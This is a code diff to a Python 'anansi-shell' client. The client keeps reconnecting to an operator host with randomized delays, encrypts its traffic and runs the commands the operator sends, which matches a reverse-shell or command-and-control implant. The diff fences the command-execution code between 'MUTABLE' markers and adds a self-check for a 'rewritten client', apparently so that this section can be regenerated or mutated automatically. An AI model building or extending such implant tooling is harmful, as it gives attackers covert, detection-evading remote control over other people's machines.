@@ -9,6 +9,7 @@ import subprocess
 import time
 
 import paramiko
+from cryptography.exceptions import InvalidTag
 from cryptography.hazmat.primitives import hashes
 from cryptography.hazmat.primitives.asymmetric.x25519 import X25519PrivateKey, X25519PublicKey
 from cryptography.hazmat.primitives.ciphers.aead import AESGCM, ChaCha20Poly1305
@@ -21,6 +22,8 @@ AEAD = {1: AESGCM, 2: ChaCha20Poly1305}
 MAX_FRAME = 2 << 20
 CHUNK = 512 * 1024
 COMMAND_TIMEOUT = 30
+MUTABLE_START = "# --- MUTABLE START ---"
+MUTABLE_END = "# --- MUTABLE END ---"
 
 
 def seal_frame(key, algo, plaintext):
@@ -109,6 +112,7 @@ def connect_forever(host, port, password, fingerprint, verbose):
             time.sleep(random.uniform(2.0, 5.0))
 
 
+# --- MUTABLE START ---
 def session(channel, verbose):
     """execute operator commands"""
     key = handshake(channel)
@@ -154,16 +158,43 @@ def change_dir(arg):
     except OSError as exc:
         return f"cd: {exc}".encode()
     return b""
+# --- MUTABLE END ---
+
+
+def selfcheck():
+    """Offline check for a rewritten client."""
+    lines = open(__file__, encoding="utf-8").read().splitlines()
+    marks = [line.strip() for line in lines if line.strip() in (MUTABLE_START, MUTABLE_END)]
+    if marks != [MUTABLE_START, MUTABLE_END]:
+        raise SystemExit("failed check: mutable markers")
+    key = os.urandom(32)
+    for algo in AEAD:
+        if unseal_frame(key, seal_frame(key, algo, b"ping")) != b"ping":
+            raise SystemExit("failed check: codec")
+    body = bytearray(seal_frame(key, 1, b"ping"))
+    body[20] ^= 1
+    try:
+        unseal_frame(key, bytes(body))
+    except InvalidTag:
+        return
+    raise SystemExit("failed check: tamper undetected")
 
 
 def main():
     parser = argparse.ArgumentParser(description="anansi-shell client")
-    parser.add_argument("--host", required=True)
+    parser.add_argument("--host")
     parser.add_argument("--port", type=int, default=2222)
-    parser.add_argument("--password", required=True)
+    parser.add_argument("--password")
     parser.add_argument("--fingerprint", help="expected host key SHA256 fingerprint")
     parser.add_argument("--verbose", action="store_true")
+    parser.add_argument("--selfcheck", action="store_true")
     args = parser.parse_args()
+    if args.selfcheck:
+        selfcheck()
+        print("selfcheck ok", flush=True)
+        return
+    if not (args.host and args.password):
+        parser.error("--host and --password are required")
     transport, channel = connect_forever(args.host, args.port, args.password,
                                          args.fingerprint, args.verbose)
     try:
